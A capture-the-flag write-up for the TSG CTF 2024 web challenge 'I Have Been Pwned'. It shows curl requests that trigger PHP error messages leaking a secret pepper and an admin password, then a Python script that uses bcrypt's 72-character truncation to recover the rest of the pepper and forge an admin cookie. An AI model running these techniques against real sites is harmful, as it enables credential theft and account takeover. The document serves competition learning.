---
title: "I Have Been Pwned - TSG CTF 2024"
category: "web"
type: "writeup"
tags: ["web", "hashcracking", "error", "php", "hash", "debug-mode", "password-cracking", "base64", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "Solved collaboratively by @Eki, @wdeilim, @gml-sec, and @ouuan."
source:
  name: "CTFtime writeup #39710"
  url: "https://ctftime.org/writeup/39710"
original_source: "https://ouuan.moe/post/2024/12/tsgctf-2024-web#i-have-been-pwned-24-solves"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "I Have Been Pwned"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** I Have Been Pwned
- **Author team:** blue-lotus
- **CTFtime tags:** web, hashcracking, error, php, hash, debug-mode, password-cracking
- **CTFtime:** <https://ctftime.org/writeup/39710>
- **Original writeup:** <https://ouuan.moe/post/2024/12/tsgctf-2024-web#i-have-been-pwned-24-solves>

---
Solved collaboratively by @Eki, @wdeilim, @gml-sec, and @ouuan.

### PHP debug message leak

Leak first 15 characters of `pepper1`:

```console  
$ curl http://34.84.32.212:8080/ -d 'auth=guest&password=%00'  
  
  
**Fatal error** : Uncaught ValueError: Bcrypt password must not contain null character in /var/www/html/index.php:21  
Stack trace:  
#0 /var/www/html/index.php(21): password_hash('PmVG7xe9ECBSgLU...', '2y')  
#1 {main}  
thrown in **/var/www/html/index.php** on line **21**  
  
```

Leak `admin_password`:

```console  
$ curl http://34.84.32.212:8080/ -d 'auth=admin&password[]='   
  
  
**Fatal error** : Uncaught TypeError: hash_equals(): Argument #2 ($user_string) must be of type string, array given in /var/www/html/index.php:13  
Stack trace:  
#0 /var/www/html/index.php(13): hash_equals('KeTzkrRuESlhd1V', Array)  
#1 {main}  
thrown in **/var/www/html/index.php** on line **13**  
  
```

### BCrypt truncating

BCrypt truncates the password to the first 72 characters. So we can truncate pepper2 and get the last character of pepper1 and each character of pepper2 by enumerating each value and verify the password hash.  
  
```python  
import requests  
from bcrypt import checkpw, hashpw, gensalt  
from base64 import b64decode, b64encode

URL = 'http://34.84.32.212:8080'

pepper1 = 'PmVG7xe9ECBSgLU'  
admin_password = 'KeTzkrRuESlhd1V'  
pepper2 = ''

def hash(password):  
res = [requests.post](http://requests.post)(URL, data={'auth': 'guest', 'password': password}, allow_redirects=False)  
b64 = res.cookies.get('hash')  
assert b64 is not None  
return b64decode(b64)

h = hash('a' * 100)  
for i in range(256):  
pw = (pepper1 + chr(i) + 'guest').ljust(72, 'a')  
if checkpw(pw.encode(), h):  
pepper1 += chr(i)  
break  
print(pepper1)

for i in range(16):  
password = 'a' * (50 - i)  
h = hash(password)  
for j in range(256):  
pw = pepper1 + 'guest' + password + pepper2 + chr(j)  
if checkpw(pw.encode(), h):  
pepper2 += chr(j)  
print(pepper2)  
break

h = hashpw((pepper1 + 'admin' + admin_password + pepper2).encode(), gensalt())  
h = b64encode(h).decode()  
res = requests.get(f'{URL}/mypage.php', cookies={'auth': 'admin', 'hash': h})  
print(res.text)  
```
